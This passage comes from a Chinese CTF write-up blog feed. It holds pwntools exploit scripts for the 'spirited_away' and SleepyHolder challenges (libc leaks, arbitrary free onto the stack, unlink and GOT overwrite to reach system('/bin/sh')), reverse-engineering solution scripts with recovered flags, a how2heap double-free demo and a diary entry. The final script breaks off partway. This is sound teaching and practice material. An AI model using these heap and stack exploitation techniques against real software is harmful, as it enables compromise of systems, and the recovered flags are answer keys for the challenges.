choice == &apos;Y&apos; || choice == &apos;y&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      free(name);                             </span><br><span class="line">      goto LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( choice == &apos;N&apos; || choice == &apos;n&apos; )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;Wrong choice.&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Bye!&quot;);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h2><p>题目疯狂使用fflush(stdout),容易让人产生怀疑。。<br>前面均使用read读入，不会在结尾加任何东西，但是在输出时使用printf会泄露栈上的内容，也就有希望得到libc基地址和栈地址；<br>第二个漏洞比较隐蔽，看了v神的思路，自己调试了半天，才终于看出这个漏洞.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);</span><br></pre></td></tr></table></figure><p>这一句看上去是没什么问题，但是在输出时，1,10,100占的位数并不相同，因为应该是把cnt以字符串形式来输出的，这样达到100次及以上之后，最后一个字母n溢出到了nbytes的位置，把原来的0x3c变成了0x6e,而这个nbytes是控制后面输入的comment的长度的，comment可以溢出到name指针的位置就能控制这个指针任意地址free，可以将其修改至栈上，之后分配name时就可以将其分配到栈上写入system(‘/bin/sh’)，rop得到shell。</p><h2 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h2><p><em>鉴于gdb还是不能与pwntools一起调试，各个地址不能得到准确值，所以之后搞好了再写完整的exp</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./spirited_away&apos;)</span><br><span class="line">bin = ELF(&apos;./spirited_away&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def comment(name,age,reason,comments):</span><br><span class="line">    sh.recvuntil(&quot;name: &quot;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(&quot;age: &quot;)</span><br><span class="line">    sh.sendline(str(age))</span><br><span class="line">    sh.recvuntil(&quot;movie? &quot;)</span><br><span class="line">    sh.sendline(reason)</span><br><span class="line">    sh.recvuntil(&quot;comment: &quot;)</span><br><span class="line">    sh.sendline(comments)</span><br><span class="line"></span><br><span class="line">comment(&apos;sir&apos;,19,&apos;a&apos;*16,&apos;b&apos;*2)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*16)</span><br><span class="line">io_file_sync9 = sh.recv(4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">libc.address = u32(io_file_sync9) - libc.sym[&apos;_IO_file_sync&apos;]-9</span><br><span class="line">success(&quot;libc_addr = &quot; + hex(libc.address))</span><br><span class="line">sh.recvuntil(&apos;Would you like to leave another comment? &lt;y/n&gt;: &apos;)</span><br><span class="line">sh.send(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">comment(&apos;sir&apos;,19,&apos;a&apos;*0x50,&apos;b&apos;*2)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*0x50)</span><br><span class="line">stack_addr = u32(sh.recv(4))- 0x28</span><br><span class="line">success(&quot;stack_addr = &quot; + hex(stack_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&apos;Would you like to leave another comment? &lt;y/n&gt;: &apos;)</span><br><span class="line">sh.send(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">    comment(&quot;sir&quot;,19,&apos;a&apos;*0x48,&apos;b&apos;*59)</span><br><span class="line">    sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)</span><br><span class="line">    sh.send(&apos;y&apos;)</span><br><span class="line">print hex(stack_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">rea = p32(0)+p32(0x41)+&apos;A&apos;*56+p32(0)+p32(0x41)</span><br><span class="line">pay = &apos;c&apos;*80 + &apos;bbbb&apos; + p32(stack_addr)+p32(0)+p32(0x41)</span><br><span class="line">comment(&apos;sir&apos;,19,rea, pay)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)</span><br><span class="line">sh.send(&apos;y&apos;)</span><br><span class="line">pay = &apos;bbbb&apos; +p32(libc.sym[&apos;system&apos;]) + &apos;bbbb&apos;+p32(libc.search(&apos;/bin/sh\x00&apos;).next())</span><br><span class="line">comment(pay, 19, &apos;a&apos;*0x20, &apos;b&apos;*2)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)</span><br><span class="line">sh.send(&apos;n&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Jarvis Oj-reverse</title>
      <link href="/2018/11/06/jarvis-oj-reverse/"/>
      <url>/2018/11/06/jarvis-oj-reverse/</url>
      <content type="html"><![CDATA[<p><em>稍微学学逆向</em></p><h1 id="FindKey"><a href="#FindKey" class="headerlink" title="FindKey"></a>FindKey</h1><p>  拿到文件顺手就往ida里拖，结果说是bin文件，所以还是乖乖将他拖到了kali里，file查看文件属性，是个pyc？（仿佛想到了某入群题）<br>  将pyc还原成py文件<br>  发现一个简单的加密过程（不过还是有点没太明白那个 +- &amp; 的执行顺序）<br>  直接上wp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">lookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] </span><br><span class="line">pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]</span><br><span class="line">pwdb = [53,222,230,35,67,248 226,216,17,209,32,2,181,200,171,60,108]</span><br><span class="line"></span><br><span class="line">flag = &quot; &quot;</span><br><span class="line">for i in range (0,17):</span><br><span class="line">    flag += chr(lookup[i + pwdb[i]] - pwda[i] &amp; 255 )</span><br><span class="line"></span><br><span class="line">f = flag[::-1]</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure><ul><li>对od产生了深深的抗拒！！ 除了打开会报毒，用起来整个电脑都卡炸了！！ 差点gg</li></ul><h1 id="stheasy"><a href="#stheasy" class="headerlink" title="stheasy"></a>stheasy</h1><p>没什么套路。。简单的加密就完事了,不过知道了ida可以使用shift+e 批量提取数据。。不用苦逼的一个个写了。</p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = [0x48,0x5d,0x8d,0x24,0x84,0x27,0x99,0x9f,0x54,0x18,0x1e,0x69,0x73,0x33,0x15,0x72,0x8d,0x33,0x24,0x63,0x21,0x54,0x0c,0x78,0x78,0x78,0x78,0x78,0x1b]</span><br><span class="line">b = &apos;lk2j9Gh&#125;AgfY4ds-a6QW1#k5ER_T[cvLbV7nOm3ZeX&#123;CMt8SZo]U&apos;</span><br><span class="line">c = &apos;&apos;</span><br><span class="line">for i in range(29):</span><br><span class="line">c+= b[a[i]/3-2]</span><br><span class="line"></span><br><span class="line">print c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ python ctf2wp.py </span><br><span class="line">kctf&#123;YoU_hAVO-GOt-fLg_233333&#125;</span><br></pre></td></tr></table></figure><h1 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h1><p>还是简单的加密，mach-o 文件，ida分析一下， 还是简单的处理，直接上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cat wp.py </span><br><span class="line">v2 = (0x20 &gt;&gt; 2 )^ 0x41</span><br><span class="line"></span><br><span class="line">a=[  0x41, 0x10, 0x11, 0x11, 0x1B, 0x0A, 0x64, 0x67, 0x6A, 0x68, 0x62, 0x68, 0x6E, 0x67, 0x68, 0x6B, 0x62, 0x3D, 0x65, 0x6A, 0x6A, 0x3D, 0x68, 0x04, 0x05, 0x08, 0x03, 0x02, 0x02, 0x55, 0x08, 0x5D, 0x61, 0x55, 0x0A, 0x5F, 0x0D, 0x5D, 0x61, 0x32, 0x17, 0x1D, 0x19, 0x1F, 0x18, 0x20, 0x04, 0x02, 0x12, 0x16,0x1E, 0x54, 0x20, 0x13, 0x14, 0x00, 0x00]</span><br><span class="line"></span><br><span class="line">b = &apos;&apos;</span><br><span class="line">for i in range(55):</span><br><span class="line">b += chr((a[i]-2)^v2)</span><br><span class="line">v2+=1</span><br><span class="line">print b</span><br><span class="line"></span><br><span class="line">$ python wp.py </span><br><span class="line">vDDCTF-5943293119a845e9bbdbde5a369c1f50@didichuxing.com</span><br></pre></td></tr></table></figure><h1 id="软件密码破解-1"><a href="#软件密码破解-1" class="headerlink" title="软件密码破解-1"></a>软件密码破解-1</h1><p>如果可以定位到关键函数的话其实还是挺简单的，ida全是函数无从下手，od 将程序跑起来，中文字符串搜索中能看到有个你赢了<br>到了地址之后，稍微往上翻便可以确定到关键判断的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">01191C51  |. /7E 16         jle short CTF_100_.01191C69</span><br><span class="line">01191C53  |. |B9 F8773001   mov ecx,CTF_100_.013077F8                ;  在此输入口令：</span><br><span class="line">01191C58  |. |8BC3          mov eax,ebx</span><br><span class="line">01191C5A  |. |2BCB          sub ecx,ebx</span><br><span class="line">01191C5C  |. |8D6424 00     lea esp,dword ptr ss:[esp]</span><br><span class="line">01191C60  |&gt; |8A1401        /mov dl,byte ptr ds:[ecx+eax]</span><br><span class="line">01191C63  |. |3010          |xor byte ptr ds:[eax],dl</span><br><span class="line">01191C65  |. |40            |inc eax</span><br><span class="line">01191C66  |. |4E            |dec esi</span><br><span class="line">01191C67  |.^|75 F7         \jnz short CTF_100_.01191C60          --》 对输入的字符串分别xor</span><br><span class="line"></span><br><span class="line">01191C69  |&gt; \813B 1B1C1746 cmp dword ptr ds:[ebx],0x46171C1B</span><br><span class="line">01191C6F  |.  0F85 E7000000 jnz CTF_100_.01191D5C</span><br><span class="line">01191C75  |.  817B 04 F4FD2&gt;cmp dword ptr ds:[ebx+0x4],0x3020FDF4</span><br><span class="line">01191C7C  |.  0F85 DA000000 jnz CTF_100_.01191D5C</span><br><span class="line">01191C82  |.  817B 08 B70C8&gt;cmp dword ptr ds:[ebx+0x8],0x7E8E0CB7</span><br><span class="line">01191C89  |.  0F85 CD000000 jnz CTF_100_.01191D5C</span><br><span class="line">01191C8F  |.  807B 0C 78    cmp byte ptr ds:[ebx+0xC],0x78</span><br><span class="line">01191C93  |.  0F85 C3000000 jnz CTF_100_.01191D5C</span><br><span class="line">01191C99  |.  807B 0D DE    cmp byte ptr ds:[ebx+0xD],0xDE     --》 xor后的值进行判断</span><br><span class="line">01191C9D  |.  0F85 B9000000 jnz CTF_100_.01191D5C</span><br></pre></td></tr></table></figure><p>很明显就是xor之后比较一下就行了，直接上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = [0x28,0x57,0x64 ,0x6B ,0x93,0x8F ,0x65 ,0x51 ,0xE3 ,0x53 ,0xE4 ,0x4E ,0x1A ,0xFF]</span><br><span class="line">b = [0x1b,0x1c,0x17,0x46,0xf4,0xfd,0x20,0x30,0xb7,0x0c,0x8e,0x7e,0x78,0xde]</span><br><span class="line">c = &apos;&apos;</span><br><span class="line">for i in range(len(a)):</span><br><span class="line">c += chr(a[i]^b[i])</span><br><span class="line"></span><br><span class="line">print c</span><br><span class="line"></span><br><span class="line">$ python 1wp.py </span><br><span class="line">3Ks-grEaT_j0b!</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>diary-20181027</title>
      <link href="/2018/10/27/diary-20181027/"/>
      <url>/2018/10/27/diary-20181027/</url>
      <content type="html"><![CDATA[<p>  或许真的是极尽苦难的一周。<br>  也是一事无成的一周。<br>  少有的一个星期什么也干不成，任何一件本应该简简单单的事情都会动辄四五个小时而迎来没有任何变化的结果。<br>  虚拟机上周已被搞得一塌糊涂，真的是失去才知道原来环境配置的多么棒。仅仅为了装pwndbg，将整个gdb给搞出了问题，并且无力回天。<br>  再之后为了装docker，看了许许多多的教程，又是大片大片的时间丢失，结果最后在角落里找到的方法，仅仅只用在src文件中加上docker的源地址，update就好了，心力交瘁。<br>  虚拟机装go的环境还算简单，没有太大的麻烦。而想着不能每次都打开虚拟机来写go，再加上意图要和同学搞个英才工程的python的团队项目，就想直接搞个vscode加上各个语言的插件呗，事实证明，这真是一个错误的选择，各种奇奇怪怪的报错，环境配置，乱到不行的目录，还是解决不了，两天就这样再次流失。<br>  所以还是选择了jetbrain家的pycharm和goland，pycharm倒是本本分分，goland却又是环境配置，还有项目的目录什么的，搞来搞去，goland的terminal又无法打开，寻找答案无果，重新安装，无果。抱着不准备管的心态，又突然不知道为什么就好了。。。蜜汁计算机。<br>  不出意外的话下个月还得去打一场工控比赛，为此又得学一下PLC的逆向，目前看来资料少的可怜，尽力而为吧。</p>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.2-fastbin_dup_consolidate</title>
      <link href="/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/"/>
      <url>/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/</url>
      <content type="html"><![CDATA[<p>比较神奇的一个利用。<br>pwntools —&gt;  cyclic   cyclic_find<br>i locals</p><h1 id="fastbin-dup-consolidate原理"><a href="#fastbin-dup-consolidate原理" class="headerlink" title="fastbin_dup_consolidate原理"></a>fastbin_dup_consolidate原理</h1><p>  当创建一个0x20-0x80大小的chunk并free的话，该chunk会被放入fastbins，此时如果再次free便会报错；但是如果此时分配一个比较大的chunk（起码smallbin大小），便会触发程序的malloc_consolidate<br>这个结果就是该chunk不再在fastbins中了，实际被转移到了unsortedbins。所以我们可以double free。</p><p>继续使用how2heap的例子来理解。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  void* p1 = malloc(0x40);</span><br><span class="line">  void* p2 = malloc(0x40);</span><br><span class="line">  fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\n&quot;, p1, p2);</span><br><span class="line">  fprintf(stderr, &quot;Now free p1!\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line"></span><br><span class="line">  void* p3 = malloc(0x400);</span><br><span class="line">  fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;, p3);</span><br><span class="line">  fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line">  fprintf(stderr, &quot;Trigger the double free vulnerability!\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: %p %p\n&quot;, malloc(0x40), malloc(0x40));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./fastbin_dup_consolidate </span><br><span class="line">Allocated two fastbins: p1=0x555dbdb57260 p2=0x555dbdb572b0</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3=0x555dbdb57300</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0x555dbdb57260 0x555dbdb57260</span><br></pre></td></tr></table></figure><h1 id="SleepyHolder"><a href="#SleepyHolder" class="headerlink" title="SleepyHolder"></a>SleepyHolder</h1><p><em>简单程度和uaf相当hhhh</em></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>main</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  unsigned int buf; // [rsp+4h] [rbp-1Ch]</span><br><span class="line">  int fd; // [rsp+8h] [rbp-18h]</span><br><span class="line">  int v6; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v8; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  alarm0x3c();                                  // </span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;Waking Sleepy Holder up ...&quot;);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 4uLL);</span><br><span class="line">  buf &amp;= 0xFFFu;</span><br><span class="line">  malloc(buf);                                  // malloc something random to change heap_address every time</span><br><span class="line">                                                // </span><br><span class="line">  sleep(3u);</span><br><span class="line">  puts(&quot;Hey! Do you have any secret?&quot;);</span><br><span class="line">  puts(&quot;I can help you to hold your secrets, and no one will be able to see it :)&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;1. Keep secret&quot;);</span><br><span class="line">    puts(&quot;2. Wipe secret&quot;);</span><br><span class="line">    puts(&quot;3. Renew secret&quot;);</span><br><span class="line">    memset(&amp;s, 0, 4uLL);</span><br><span class="line">    read(0, &amp;s, 4uLL);</span><br><span class="line">    v3 = atoi(&amp;s);</span><br><span class="line">    v6 = v3;</span><br><span class="line">    switch ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 2:</span><br><span class="line">        wipe_secret();     //仅仅把free掉并把该chunk的inuse位标记为0</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        renew_secret();    //重新改写1或者2的chunk，大小最大还是原来那么大。</span><br><span class="line">        break;</span><br><span class="line">      case 1:</span><br><span class="line">        keep_serect();    //选择123来使用calloc分别分配大小为40,4000,400000大小的chunk且都只能分配一块，12的chunk可以wipe或者renew，3的chunk分配就再也没法变了。inuse位会被标记为1.</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>假设三个chunk分别为chunk0,1,2;</p><ol><li>首先使用malloc_consolidate()，将chunk0 double free，进入unsortedbin，这个时候再申请chunk0，会将其从fastbin中取下，且inuse位被标记为1.</li><li>之后使用unlink，伪造在chunk0中，free chunk1，fake chunk便会被free进入chunklist。</li><li>通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址。</li><li>算出system的地址，并将其写入free_got，调用free便可以getshell。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">p = process(&apos;./SleepyHolder&apos;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./SleepyHolder&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)     //ldd ./SleepyHolder</span><br><span class="line"></span><br><span class="line">def add(index, content):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;secret: \n&apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;2. Big secret\n&apos;)</span><br><span class="line">p.send(str(index))</span><br><span class="line"></span><br><span class="line">def update(index, content):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;2. Big secret\n&apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;secret: \n&apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">#分配chunk1 chunk2</span><br><span class="line">add(1, &apos;a&apos;*0x10)</span><br><span class="line">add(2, &apos;b&apos;*0x10)</span><br><span class="line">#释放chunk1</span><br><span class="line">delete(1)</span><br><span class="line">#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0</span><br><span class="line">add(3, &apos;c&apos;*0x10)</span><br><span class="line">#这时再释放chunk1，让chunk1重新进入fast bin</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span 